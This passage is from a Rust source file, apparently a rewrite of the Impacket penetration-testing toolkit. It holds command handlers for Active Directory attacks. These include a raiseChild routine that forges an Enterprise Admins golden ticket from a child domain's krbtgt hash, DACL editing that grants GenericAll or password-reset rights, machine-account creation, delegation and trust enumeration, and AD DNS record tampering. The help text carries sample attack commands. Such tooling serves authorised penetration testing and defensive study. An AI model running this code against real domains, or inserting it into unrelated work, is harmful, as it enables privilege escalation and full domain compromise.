                DelegationType::ResourceBased { allowed_sids } => {
                    for s in allowed_sids {
                        println!("  [Trustee SID] {} ===(RBCD)===> [Resource] {}", s, r.sam_account_name);
                    }
                }
            }
        }
        println!();
    }

    if show_json {
        println!("=== DELEGATION JSON EXPORT ===");
        print!("[");
        for (i, r) in records.iter().enumerate() {
            let (del_type, targets_json) = match &r.delegation {
                DelegationType::Unconstrained { is_dc } => {
                    ("Unconstrained", format!("\"is_dc\": {}", is_dc))
                }
                DelegationType::Constrained { protocol_transition, allowed_targets } => {
                    let ts = allowed_targets.iter().map(|t| format!("\"{}\"", t)).collect::<Vec<_>>().join(",");
                    ("Constrained", format!("\"protocol_transition\": {}, \"allowed_targets\": [{}]", protocol_transition, ts))
                }
                DelegationType::ResourceBased { allowed_sids } => {
                    let sids = allowed_sids.iter().map(|s| format!("\"{}\"", s)).collect::<Vec<_>>().join(",");
                    ("RBCD", format!("\"allowed_sids\": [{}]", sids))
                }
            };
            if i > 0 {
                print!(",");
            }
            print!(
                r#"{{"sam_account_name":"{}","dn":"{}","uac":{},"type":"{}","config":{{{}}}}}"#,
                r.sam_account_name, r.dn, r.user_account_control, del_type, targets_json
            );
        }
        println!("]");
    }

    client.unbind().ok();
}

fn cmd_true_tree(args: &[String]) {
    use impacket_ldap::asn1::SearchScope;
    use impacket_ldap::LdapClient;

    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs trueTree <TARGET> [options]");
        println!("  Discovers Active Directory domain trust relationships & forest hierarchy ([trueTree.py])");
        println!();
        println!("Options:");
        println!("  -base <BASE_DN>    Base DN to search (defaults to RootDSE defaultNamingContext)");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut custom_base: Option<String> = None;
    let mut i = 1;
    while i < args.len() {
        if args[i] == "-base" && i + 1 < args.len() {
            custom_base = Some(args[i + 1].clone());
            i += 2;
        } else {
            i += 1;
        }
    }

    let addr = format!("{}:389", spec.effective_target_ip());
    println!("[*] Connecting to LDAP at {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connect failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };
    let pass = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        if let Err(e) = client.bind_simple(&bind_dn, pass) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Authenticated as '{}'", bind_dn);
    } else {
        let _ = client.bind_simple("", "");
        println!("[*] Anonymous LDAP bind");
    }

    let mut default_nc = String::new();
    let mut root_nc = String::new();
    if let Ok(dse_entries) = client.search("", SearchScope::BaseObject, b"(objectClass=*)", &["defaultNamingContext", "rootDomainNamingContext"]) {
        if let Some(dse) = dse_entries.first() {
            if let Some(raw) = dse.get_first_raw("defaultNamingContext") {
                default_nc = String::from_utf8_lossy(raw).into_owned();
            }
            if let Some(raw) = dse.get_first_raw("rootDomainNamingContext") {
                root_nc = String::from_utf8_lossy(raw).into_owned();
            }
        }
    }

    let base_dn = custom_base.unwrap_or_else(|| {
        if !default_nc.is_empty() {
            format!("CN=System,{}", default_nc)
        } else if !spec.domain.is_empty() {
            format!("CN=System,{}", spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(","))
        } else {
            String::new()
        }
    });

    println!("[*] Querying trusted domain objects under '{}'...", base_dn);
    let filter = "(objectClass=trustedDomain)";
    let attrs = ["trustPartner", "flatName", "trustDirection", "trustType", "trustAttributes", "securityIdentifier"];
    let entries = match client.search(&base_dn, SearchScope::WholeSubtree, filter.as_bytes(), &attrs) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("[-] Search failed: {}", e);
            return;
        }
    };

    println!("\n=== Active Directory Domain & Forest Trust Tree ===");
    println!("Root Domain Naming Context    : {}", if root_nc.is_empty() { "<unknown>" } else { &root_nc });
    println!("Current Domain Naming Context : {}", if default_nc.is_empty() { "<unknown>" } else { &default_nc });
    println!("Discovered Trusted Domains    : {}\n", entries.len());

    if entries.is_empty() {
        println!("  [+] No external domain trusts found (Standalone domain or lack of read permissions).");
    } else {
        for entry in &entries {
            let partner = entry.get_first_raw("trustPartner")
                .map(|b| String::from_utf8_lossy(b).into_owned())
                .unwrap_or_else(|| "<unknown>".to_string());
            let flat = entry.get_first_raw("flatName")
                .map(|b| String::from_utf8_lossy(b).into_owned())
                .unwrap_or_else(|| "<none>".to_string());
            let direction_code = entry.get_first_raw("trustDirection")
                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
                .unwrap_or(0);
            let dir_str = match direction_code {
                1 => "INBOUND (Trusting)",
                2 => "OUTBOUND (Trusted)",
                3 => "BIDIRECTIONAL (Two-Way)",
                _ => "DISABLED",
            };
            let type_code = entry.get_first_raw("trustType")
                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
                .unwrap_or(0);
            let type_str = match type_code {
                1 => "Downlevel (Windows NT)",
                2 => "Uplevel (Active Directory)",
                3 => "MIT Kerberos Realm",
                _ => "Unknown",
            };
            let attr_code = entry.get_first_raw("trustAttributes")
                .and_then(|b| std::str::from_utf8(b).ok()?.parse::<u32>().ok())
                .unwrap_or(0);
            let sid_str = entry.get_first_raw("securityIdentifier")
                .and_then(|b| impacket_ndr::RpcSid::from_le_bytes(b).ok())
                .map(|s| s.to_string())
                .unwrap_or_else(|| "<none>".to_string());

            println!("  [+] Trust Partner : {} (NetBIOS: {})", partner, flat);
            println!("      Direction     : {}", dir_str);
            println!("      Type          : {}", type_str);
            println!("      Attributes    : 0x{:08X}", attr_code);
            println!("      Domain SID    : {}", sid_str);
            println!();
        }
    }
    client.unbind().ok();
}

fn cmd_raise_child(args: &[String]) {
    use impacket_core::decode_hex;
    use impacket_krb5::ticketer::{forge_ticket, TicketOptions};
    use impacket_ldap::asn1::SearchScope;
    use impacket_ldap::LdapClient;

    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs raiseChild <CHILD_DC_TARGET> [options] <OUTPUT_TICKET>");
        println!("  Child-to-Parent Forest Root Privilege Escalation ([raiseChild.py])");
        println!("  Extracts child krbtgt and parent domain SID to forge an Enterprise Admins ticket");
        println!();
        println!("Options:");
        println!("  -child-sid <SID>       Child domain SID (queried automatically via LDAP if omitted)");
        println!("  -parent-sid <SID>      Parent / Forest root domain SID (queried automatically if omitted)");
        println!("  -parent-domain <FQDN>  Parent domain FQDN (e.g. corp.local)");
        println!("  -nthash <HEX>          Child krbtgt NT hash");
        println!("  -aesKey <HEX>          Child krbtgt AES-128 or AES-256 key");
        println!("  -user <USER>           User to forge (default: Administrator)");
        println!("  -kirbi                 Export as Mimikatz .kirbi format instead of MIT .ccache");
        return;
    }

    let mut output_file: Option<String> = None;
    let mut child_sid_str: Option<String> = None;
    let mut parent_sid_str: Option<String> = None;
    let mut parent_domain: Option<String> = None;
    let mut nthash_str: Option<String> = None;
    let mut aeskey_str: Option<String> = None;
    let mut target_user = "Administrator".to_string();
    let mut export_kirbi = false;
    let mut rest_args = Vec::new();

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-child-sid" if i + 1 < args.len() => {
                child_sid_str = Some(args[i + 1].clone());
                i += 2;
            }
            "-parent-sid" if i + 1 < args.len() => {
                parent_sid_str = Some(args[i + 1].clone());
                i += 2;
            }
            "-parent-domain" if i + 1 < args.len() => {
                parent_domain = Some(args[i + 1].clone());
                i += 2;
            }
            "-nthash" if i + 1 < args.len() => {
                nthash_str = Some(args[i + 1].clone());
                i += 2;
            }
            "-aesKey" if i + 1 < args.len() => {
                aeskey_str = Some(args[i + 1].clone());
                i += 2;
            }
            "-user" if i + 1 < args.len() => {
                target_user = args[i + 1].clone();
                i += 2;
            }
            "-kirbi" => {
                export_kirbi = true;
                i += 1;
            }
            _ => {
                if !args[i].starts_with('-') && output_file.is_none() && i > 0 {
                    output_file = Some(args[i].clone());
                } else {
                    rest_args.push(args[i].clone());
                }
                i += 1;
            }
        }
    }

    let spec = match parse_target_with_hashes(&rest_args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Target error: {}", e);
            std::process::exit(1);
        }
    };

    let out_path = output_file.unwrap_or_else(|| {
        if export_kirbi { "ticket.kirbi".to_string() } else { "ticket.ccache".to_string() }
    });

    if child_sid_str.is_none() || parent_sid_str.is_none() {
        println!("[*] Querying Domain SIDs from {}...", spec.effective_target_ip());
        let addr = format!("{}:389", spec.effective_target_ip());
        if let Ok(mut ldap) = LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
            let pass = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
            let _ = ldap.bind_simple(&spec.username, pass);
            if let Ok(dse_entries) = ldap.search("", SearchScope::BaseObject, b"(objectClass=*)", &["defaultNamingContext"]) {
                if let Some(dse) = dse_entries.first() {
                    if let Some(raw_nc) = dse.get_first_raw("defaultNamingContext") {
                        let d_nc = String::from_utf8_lossy(raw_nc);
                        if let Ok(entries) = ldap.search(&d_nc, SearchScope::BaseObject, b"(objectClass=*)", &["objectSid"]) {
                            if let Some(e) = entries.first() {
                                if let Some(raw) = e.get_first_raw("objectSid") {
                                    if let Ok(s) = impacket_ndr::RpcSid::from_le_bytes(raw) {
                                        println!("[+] Child Domain SID: {}", s);
                                        if child_sid_str.is_none() {
                                            child_sid_str = Some(s.to_string());
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    let c_sid_val = match child_sid_str {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing required -child-sid <SID>");
            std::process::exit(1);
        }
    };

    let p_sid_val = match parent_sid_str {
        Some(s) => s,
        None => {
            eprintln!("[-] Missing required -parent-sid <SID>");
            std::process::exit(1);
        }
    };

    let c_sid = match RpcSid::parse(&c_sid_val) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Invalid child SID '{}': {}", c_sid_val, e);
            std::process::exit(1);
        }
    };

    let ea_extra_sid = format!("{}-519", p_sid_val);
    println!("[*] Elevating Child Domain -> Parent Forest Root via Golden Ticket");
    println!("  Child Domain SID  : {}", c_sid_val);
    println!("  Parent Domain SID : {}", p_sid_val);
    println!("  Extra SID (EA)    : {}", ea_extra_sid);

    let (key_bytes, etype) = if let Some(ref a_str) = aeskey_str {
        let b = decode_hex(a_str).expect("Valid hex AES key");
        let et = if b.len() == 16 { 17 } else { 18 };
        (b, et)
    } else if let Some(ref n_str) = nthash_str {
        let b = decode_hex(n_str).expect("Valid hex NT hash");
        (b, 23)
    } else {
        eprintln!("[-] Must specify child krbtgt key (-nthash <HEX> or -aesKey <HEX>)");
        std::process::exit(1);
    };

    let domain_name = parent_domain.unwrap_or_else(|| spec.domain.clone());
    let opts = TicketOptions {
        domain: domain_name.to_uppercase(),
        username: target_user.clone(),
        domain_sid: c_sid,
        user_rid: 500,
        group_rids: vec![512, 513, 519, 520, 518],
        spn: vec!["krbtgt".to_string(), domain_name.to_uppercase()],
        key: key_bytes,
        etype,
        duration_hours: 10,
    };

    let ccache = match forge_ticket(&opts) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] Ticket forgery error: {}", e);
            std::process::exit(1);
        }
    };

    if export_kirbi {
        match ccache.to_kirbi() {
            Ok(kirbi_data) => {
                std::fs::write(&out_path, &kirbi_data).expect("write kirbi");
                println!("[+] Successfully forged Enterprise Admins ticket -> '{}' (Mimikatz .kirbi)", out_path);
            }
            Err(e) => {
                eprintln!("[-] Error converting to .kirbi: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        std::fs::write(&out_path, ccache.to_bytes()).expect("write ccache");
        println!("[+] Successfully forged Enterprise Admins ticket -> '{}' (MIT .ccache)", out_path);
    }
}

fn cmd_smbpasswd(args: &[String]) {
    cmd_changepasswd(args);
}

fn cmd_split(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs split <FILE> [-size <BYTES>]");
        println!("  Splits a large database, wordlist, or dump file into chunks ([split.py])");
        return;
    }
    let file_path = &args[0];
    let mut chunk_size = 10 * 1024 * 1024usize;
    let mut i = 1;
    while i < args.len() {
        if args[i] == "-size" && i + 1 < args.len() {
            chunk_size = args[i + 1].parse().unwrap_or(10 * 1024 * 1024);
            i += 2;
        } else {
            i += 1;
        }
    }

    let data = match std::fs::read(file_path) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] Error opening '{}': {}", file_path, e);
            return;
        }
    };

    let total = data.len();
    let num_chunks = (total + chunk_size - 1) / chunk_size;
    println!("[*] Splitting '{}' ({} bytes) into {} chunks of {} bytes...", file_path, total, num_chunks, chunk_size);
    for idx in 0..num_chunks {
        let start = idx * chunk_size;
        let end = std::cmp::min(start + chunk_size, total);
        let part_name = format!("{}.part{:03}", file_path, idx + 1);
        if let Err(e) = std::fs::write(&part_name, &data[start..end]) {
            eprintln!("[-] Error writing chunk '{}': {}", part_name, e);
            return;
        }
        println!("  [+] Wrote '{}' ({} bytes)", part_name, end - start);
    }
    println!("[+] Splitting completed successfully.");
}

fn cmd_addcomputer(args: &[String]) {
    use impacket_ldap::addcomputer::{add_computer, generate_computer_password};
    use impacket_ldap::LdapClient;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs addcomputer <TARGET> [-computer-name <NAME>] [-computer-pass <PASS>] [-ou <OU_DN>] [-hashes LM:NT]");
        eprintln!("  Provisions an Active Directory machine account via LDAP AddRequest ([APPLICATION 8])");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut comp_name: Option<String> = None;
    let mut comp_pass: Option<String> = None;
    let mut ou_dn: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-computer-name" | "-name" if i + 1 < args.len() => {
                comp_name = Some(args[i + 1].clone());
                i += 2;
            }
            "-computer-pass" | "-password" if i + 1 < args.len() => {
                comp_pass = Some(args[i + 1].clone());
                i += 2;
            }
            "-ou" if i + 1 < args.len() => {
                ou_dn = Some(args[i + 1].clone());
                i += 2;
            }
            _ => i += 1,
        }
    }

    let name = comp_name.unwrap_or_else(|| {
        let rand_id = impacket_core::encode_hex(&impacket_crypto::sha256(b"computer_rand_name")[..3]);
        format!("WS-{}", rand_id.to_uppercase())
    });
    let pass = comp_pass.unwrap_or_else(generate_computer_password);
    let parent_dn = ou_dn.unwrap_or_else(|| {
        if !spec.domain.is_empty() {
            let base = spec.domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",");
            format!("CN=Computers,{}", base)
        } else {
            String::new()
        }
    });

    let host = spec.effective_target_ip();
    let addr = format!("{}:389", host);
    println!("[*] Connecting to LDAP on {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connection failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Authenticating as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful.");
    }

    println!("[*] Provisioning machine account: {} under '{}'...", name, parent_dn);
    match add_computer(&mut client, &parent_dn, &name, &pass, &spec.domain) {
        Ok(entry_dn) => {
            println!("[+] Successfully created computer account!");
            println!("  Distinguished Name : {}", entry_dn);
            println!("  sAMAccountName     : {}$", name.trim_end_matches('$'));
            println!("  Password           : {}", pass);
            println!("  SPNs               : HOST/{}, RestrictedKrbHost/{}", name, name);
        }
        Err(e) => {
            eprintln!("[-] Failed to add computer: {}", e);
            std::process::exit(1);
        }
    }

    client.unbind().ok();
}

fn cmd_dacledit(args: &[String]) {
    use impacket_ldap::dacledit::{grant_right, read_dacl, revoke_rights, DaclRight};
    use impacket_ldap::LdapClient;
    use impacket_ndr::RpcSid;

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs dacledit <TARGET> -target-dn <DN> [-action read|write|remove] [-trustee-sid <SID>] [-right <RIGHT>] [-hashes LM:NT]");
        eprintln!("  Rights: GenericAll, WriteDacl, WriteOwner, ResetPassword");
        eprintln!("  Examples:");
        eprintln!("    impacket-rs dacledit corp.contoso.com/admin:pass@dc01 -target-dn \"CN=Domain Admins,CN=Users,DC=corp,DC=contoso,DC=com\" -action read");
        eprintln!("    impacket-rs dacledit corp.contoso.com/admin:pass@dc01 -target-dn \"CN=targetUser,CN=Users,DC=corp,DC=contoso,DC=com\" -action write -trustee-sid S-1-5-21-123-456-789-1105 -right GenericAll");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut target_dn: Option<String> = None;
    let mut action = "read".to_string();
    let mut trustee_sid: Option<RpcSid> = None;
    let mut dacl_right = DaclRight::GenericAll;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-target-dn" | "-dn" if i + 1 < args.len() => {
                target_dn = Some(args[i + 1].clone());
                i += 2;
            }
            "-action" if i + 1 < args.len() => {
                action = args[i + 1].to_lowercase();
                i += 2;
            }
            "-trustee-sid" | "-sid" if i + 1 < args.len() => {
                match RpcSid::parse(&args[i + 1]) {
                    Ok(s) => trustee_sid = Some(s),
                    Err(e) => {
                        eprintln!("[-] Invalid trustee SID '{}': {}", args[i + 1], e);
                        std::process::exit(1);
                    }
                }
                i += 2;
            }
            "-right" if i + 1 < args.len() => {
                if let Some(r) = DaclRight::parse(&args[i + 1]) {
                    dacl_right = r;
                } else {
                    eprintln!("[-] Unknown DACL right '{}': choose GenericAll, WriteDacl, WriteOwner, or ResetPassword", args[i + 1]);
                    std::process::exit(1);
                }
                i += 2;
            }
            _ => i += 1,
        }
    }

    let dn = match target_dn {
        Some(d) => d,
        None => {
            eprintln!("[-] Missing mandatory parameter: -target-dn <DN>");
            std::process::exit(1);
        }
    };

    let host = spec.effective_target_ip();
    let addr = format!("{}:389", host);
    println!("[*] Connecting to LDAP on {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connection failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Authenticating as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful.");
    }

    match action.as_str() {
        "read" => {
            println!("[*] Reading DACL of '{}'...", dn);
            match read_dacl(&mut client, &dn) {
                Ok(sd) => {
                    if let Some(dacl) = sd.dacl {
                        println!("[+] DACL contains {} ACE(s):", dacl.aces.len());
                        for (idx, ace) in dacl.aces.iter().enumerate() {
                            let type_str = match ace.ace_type {
                                0x00 => "ACCESS_ALLOWED",
                                0x01 => "ACCESS_DENIED",
                                0x05 => "ACCESS_ALLOWED_OBJECT",
                                _ => "OTHER",
                            };
                            println!("  [{}] Type: {} | Mask: 0x{:08X} | Trustee: {}", idx + 1, type_str, ace.mask, ace.sid.to_string());
                        }
                    } else {
                        println!("[*] Object does not have a DACL.");
                    }
                }
                Err(e) => eprintln!("[-] DACL read failed: {}", e),
            }
        }
        "write" => {
            let trustee = match trustee_sid {
                Some(s) => s,
                None => {
                    eprintln!("[-] -action write requires -trustee-sid <SID>");
                    std::process::exit(1);
                }
            };
            println!("[*] Granting {:?} on '{}' to trustee '{}'...", dacl_right, dn, trustee.to_string());
            match grant_right(&mut client, &dn, &trustee, dacl_right) {
                Ok(()) => println!("[+] DACL modification written successfully!"),
                Err(e) => eprintln!("[-] DACL modification failed: {}", e),
            }
        }
        "remove" => {
            let trustee = match trustee_sid {
                Some(s) => s,
                None => {
                    eprintln!("[-] -action remove requires -trustee-sid <SID>");
                    std::process::exit(1);
                }
            };
            println!("[*] Revoking ACEs for trustee '{}' from '{}'...", trustee.to_string(), dn);
            match revoke_rights(&mut client, &dn, &trustee) {
                Ok(count) => println!("[+] Revoked {} ACE(s) matching trustee.", count),
                Err(e) => eprintln!("[-] DACL revoke failed: {}", e),
            }
        }
        other => eprintln!("[-] Unknown action '{}': choose read, write, or remove", other),
    }

    client.unbind().ok();
}

fn cmd_dnstool(args: &[String]) {
    use impacket_ldap::{
        add_dns_node, delete_dns_node, format_dns_record_data, list_dns_zones, modify_dns_node,
        query_dns_node, tombstone_dns_node, DnsRecordData, DnsRecordType, DnsRpcRecord,
        LdapClient, SearchScope, filter_present,
    };
    use std::net::{Ipv4Addr, Ipv6Addr};

    print!("{}", version::BANNER);
    if args.is_empty() {
        eprintln!("Usage: impacket-rs dnstool <TARGET> -action <query|add|modify|tombstone|delete> [options]");
        eprintln!("  Active Directory Integrated DNS record management over LDAP ([MS-DNSP])");
        eprintln!("  Options:");
        eprintln!("    -action, -a <ACT>   Action: query, add, modify, tombstone, delete (default: query)");
        eprintln!("    -record, -r <NAME>  Record / node name (e.g. 'web', 'dc01', '@', or '*' for all)");
        eprintln!("    -zone, -z <ZONE>    DNS zone name or DN (e.g. 'corp.local'). Auto-discovered if omitted");
        eprintln!("    -type, -t <TYPE>    Record type: A, AAAA, CNAME, PTR, TXT, SRV, MX (default: A)");
        eprintln!("    -data, -d <DATA>    Record payload (IP address, host name, or text)");
        eprintln!("    --ttl <SECONDS>     TTL in seconds (default: 300)");
        eprintln!("    --priority <NUM>    SRV priority (default: 0)");
        eprintln!("    --weight <NUM>      SRV weight (default: 100)");
        eprintln!("    --port <PORT>       SRV port (default: 389)");
        eprintln!("    --preference <NUM>  MX preference (default: 10)");
        eprintln!("    -tcp                Connect via LDAP TCP/389 (default)");
        eprintln!("    -ssl                Connect via LDAPS TCP/636");
        eprintln!("    -hashes LM:NT       Pass-the-Hash");
        std::process::exit(1);
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(t) => t,
        Err(e) => {
            eprintln!("[-] Invalid target '{}': {}", args[0], e);
            std::process::exit(1);
        }
    };

    let mut action = "query".to_string();
    let mut record_name = "*".to_string();
    let mut zone_name: Option<String> = None;
    let mut record_type_str = "A".to_string();
    let mut record_data: Option<String> = None;
    let mut ttl: u32 = 300;
    let mut srv_priority: u16 = 0;
    let mut srv_weight: u16 = 100;
    let mut srv_port: u16 = 389;
    let mut mx_pref: u16 = 10;
    let mut use_ssl = false;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-action" | "-a" if i + 1 < args.len() => {
                action = args[i + 1].to_lowercase();
                i += 2;
            }
            "-record" | "-r" if i + 1 < args.len() => {
                record_name = args[i + 1].clone();
                i += 2;
            }
            "-zone" | "-z" if i + 1 < args.len() => {
                zone_name = Some(args[i + 1].clone());
                i += 2;
            }
            "-type" | "-t" if i + 1 < args.len() => {
                record_type_str = args[i + 1].to_uppercase();
                i += 2;
            }
            "-data" | "-d" if i + 1 < args.len() => {
                record_data = Some(args[i + 1].clone());
                i += 2;
            }
            "--ttl" if i + 1 < args.len() => {
                ttl = args[i + 1].parse().unwrap_or(300);
                i += 2;
            }
            "--priority" if i + 1 < args.len() => {
                srv_priority = args[i + 1].parse().unwrap_or(0);
                i += 2;
            }
            "--weight" if i + 1 < args.len() => {
                srv_weight = args[i + 1].parse().unwrap_or(100);
                i += 2;
            }
            "--port" if i + 1 < args.len() => {
                srv_port = args[i + 1].parse().unwrap_or(389);
                i += 2;
            }
            "--preference" if i + 1 < args.len() => {
                mx_pref = args[i + 1].parse().unwrap_or(10);
                i += 2;
            }
            "-ssl" => {
                use_ssl = true;
                i += 1;
            }
            "-tcp" => {
                use_ssl = false;
                i += 1;
            }
            _ => i += 1,
        }
    }

    let host = spec.effective_target_ip();
    let port = if use_ssl { 636 } else { 389 };
    let addr = format!("{}:{}", host, port);

    println!("[*] Connecting to LDAP on {}...", addr);
    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] LDAP connection failed: {}", e);
            std::process::exit(1);
        }
    };

    let bind_dn = if spec.username.is_empty() {
        String::new()
    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
        spec.username.clone()
    } else if !spec.domain.is_empty() {
        format!("{}@{}", spec.username, spec.domain)
    } else {
        spec.username.clone()
    };

    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
    if !bind_dn.is_empty() {
        println!("[*] Authenticating as '{}'...", bind_dn);
        if let Err(e) = client.bind_simple(&bind_dn, password) {
            eprintln!("[-] LDAP bind failed: {}", e);
            std::process::exit(1);
        }
        println!("[+] Bind successful.");
    }

    let domain_dn = if !spec.domain.is_empty() {
        spec.domain
            .split('.')
            .map(|p| format!("DC={}", p))
            .collect::<Vec<_>>()
            .join(",")
    } else {
        match client.search_unpaged("", SearchScope::BaseObject, &filter_present("objectClass"), &["defaultNamingContext"]) {
            Ok(entries) => {
                entries.first().and_then(|e| e.get_string("defaultNamingContext")).unwrap_or_default()
            }
            Err(_) => String::new(),
        }
    };

    if domain_dn.is_empty() {
        eprintln!("[-] Could not determine domain DN. Please specify target domain: domain/user@host");
        std::process::exit(1);
    }

    println!("[*] Resolving Active Directory DNS zones in {}...", domain_dn);
    let zones = match list_dns_zones(&mut client, &domain_dn) {
        Ok(z) => z,
        Err(e) => {
            eprintln!("[-] Failed to list DNS zones: {}", e);
            std::process::exit(1);
        }
    };

    if zones.is_empty() {
        eprintln!("[-] No AD Integrated DNS zones found in domain partitions.");
        std::process::exit(1);
    }

    let selected_zone = if let Some(ref z_req) = zone_name {
        if z_req.to_uppercase().starts_with("DC=") {
            (z_req.clone(), z_req.clone())
        } else {
            match zones.iter().find(|(name, _)| name.eq_ignore_ascii_case(z_req)) {
                Some(pair) => pair.clone(),
                None => {
                    eprintln!("[-] Zone '{}' not found. Available zones:", z_req);
                    for (z, dn) in &zones {
                        eprintln!("    - {} ({})", z, dn);
                    }
                    std::process::exit(1);
                }
            }
        }
    } else {
        let chosen = zones
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(&spec.domain))
            .unwrap_or(&zones[0]);
        chosen.clone()
    };

    let (zone_display, zone_dn) = selected_zone;
    println!("[+] Selected DNS zone: {} ({})", zone_display, zone_dn);

    match action.as_str() {
        "query" | "list" => {
            println!("[*] Querying DNS record(s) '{}' in zone {}...", record_name, zone_display);
            match query_dns_node(&mut client, &zone_dn, &record_name) {
                Ok(nodes) => {
                    if nodes.is_empty() {
                        println!("[*] No DNS nodes found matching '{}'.", record_name);
                    } else {
                        println!("[+] Found {} DNS node(s):", nodes.len());
                        for node in nodes {
                            let tomb_tag = if node.is_tombstoned { " (TOMBSTONED)" } else { "" };
                            println!("[*] Node: {}{}", node.node_name, tomb_tag);
                            if node.records.is_empty() {
                                println!("    (no records)");
                            } else {
                                for rec in node.records {
                                    println!(
                                        "    - {:<6} | TTL: {:<5}s | Serial: {:<6} | {}",
                                        rec.record_type.name(),
                                        rec.ttl_seconds,
                                        rec.serial,
                                        format_dns_record_data(&rec.data)
                                    );
                                }
                            }
                        }
                    }
                }
                Err(e) => eprintln!("[-] DNS query failed: {}", e),
            }
        }
        "add" | "modify" => {
            let data_str = match record_data {
                Some(d) => d,
                None => {
                    eprintln!("[-] Action '{}' requires -data <PAYLOAD>", action);
                    std::process::exit(1);
                }
            };
            if record_name == "*" {
                eprintln!("[-] Action '{}' requires a specific record name with -record <NAME>", action);
                std::process::exit(1);
            }

            let rtype = match DnsRecordType::parse_str(&record_type_str) {
                Some(t) => t,
                None => {
                    eprintln!("[-] Unsupported record type '{}'", record_type_str);
                    std::process::exit(1);
                }
            };

            let record = match rtype {
                DnsRecordType::A => {
                    match data_str.parse::<Ipv4Addr>() {
                        Ok(ip) => DnsRpcRecord::new_a(ip, ttl, 0),
                        Err(e) => {
                            eprintln!("[-] Invalid IPv4 address '{}': {}", data_str, e);
                            std::process::exit(1);
                        }
                    }
                }
                DnsRecordType::Aaaa => {
                    match data_str.parse::<Ipv6Addr>() {
                        Ok(ip) => DnsRpcRecord::new_aaaa(ip, ttl, 0),
                        Err(e) => {
                            eprintln!("[-] Invalid IPv6 address '{}': {}", data_str, e);
                            std::process::exit(1);
                        }
                    }
                }
                DnsRecordType::Cname => DnsRpcRecord::new_cname(&data_str, ttl, 0),
